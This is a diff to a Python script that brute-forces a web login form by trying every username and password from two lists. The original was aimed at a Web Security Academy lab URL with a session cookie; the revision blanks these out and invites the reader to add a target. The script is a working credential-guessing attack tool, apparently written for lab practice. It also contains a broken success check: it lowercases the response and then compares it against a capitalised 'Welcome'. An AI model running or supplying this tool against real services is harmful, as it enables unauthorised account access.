@@ -1,26 +1,29 @@
+# this script fuzzes username and password using your own lists
+# add URL and cookies, you can also modify request timing and the conditions to detect code == 200
+
 import requests
 import time
 import sys
 
-with open('/home/maximo/Documents/Programming/Python_Practice/username.txt', 'r') as user_file:
+with open('username.txt', 'r') as user_file:
     usernames = [line.strip() for line in user_file if line.strip()]
 
-with open('/home/maximo/Documents/Programming/Python_Practice/password.txt', 'r') as pass_file:
+with open('password.txt', 'r') as pass_file:
     passwords = [line.strip() for line in pass_file if line.strip()]
 
 cookies = {
-    "session": "OL7k5pQMW1MjKeolR8uDEav5iyK2FWp7",
+    "session": "",
 }
 
-url = "https://0ae600310459bbf580f16c5d00870036.web-security-academy.net/login"
+url = ""
 
 DELAY = 0.5
 TIMEOUT = 6
 
-print(f"Iniciando ataque...")
+print(f"starting attack...")
 
 count = 0
-ruta_archivo = "/home/maximo/Documents/credenciales.txt"
+ruta_archivo = "/home///credenciales.txt"
 
 for username in usernames:
     for password in passwords:
@@ -32,22 +35,21 @@ for username in usernames:
         }
 
         if count % 10 == 0:
-            print(f"Intentos realizados: {count}")
-        print(f"Probando: {username}:{password}")
+            print(f"attempts made: {count}")
+        print(f"Trying: {username}:{password}")
         
         try:
             response = requests.post(url, data=data, cookies=cookies, timeout=TIMEOUT)
 
-            # Verificar si el login fue exitoso
             if response.status_code == 200:
-                if "bienvenido" in response.text.lower() or "dashboard" in response.text.lower():
-                    print(f"se encontro: Usuario: {username}, Contraseña: {password}")
+                if "Welcome" in response.text.lower() or "dashboard" in response.text.lower():
+                    print(f"Find: User: {username}, Password: {password}")
                     with open(ruta_archivo, 'w') as f:
-                        f.write(f"Usuario: {username}\nContraseña: {password}")
+                        f.write(f"User: {username}\nPassword: {password}")
                     sys.exit(0)  
                     
         except Exception as e:
             print(f"Error: {e}")
         time.sleep(DELAY)
 
-print("Proceso completado")
+print("Process Completes")
